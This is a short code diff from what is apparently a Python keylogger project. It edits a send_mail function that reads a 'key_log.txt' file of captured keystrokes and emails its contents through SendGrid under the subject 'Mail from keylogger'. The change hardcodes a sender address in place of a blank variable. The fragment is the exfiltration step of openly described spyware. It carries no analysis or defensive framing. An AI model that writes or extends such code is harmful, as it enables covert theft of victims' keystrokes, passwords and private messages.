@@ -14,7 +14,6 @@ load_dotenv()
 def send_mail():
     li = []
     to_mail = ['']
-    from_mail = ''
     SENDGRID_API_KEY=os.getenv('SEND_GRID')
     #Add your own sendgrid API key
     pdf = open('key_log.txt', "r").read()
@@ -28,7 +27,7 @@ def send_mail():
 
     main = '\n'.join(li)
     message = Mail(
-        from_email=from_mail,
+        from_email='jidnyesh_keylogger@gmail.com',
         to_emails=to_mail,
         subject='Mail from keylogger',
         html_content=main)
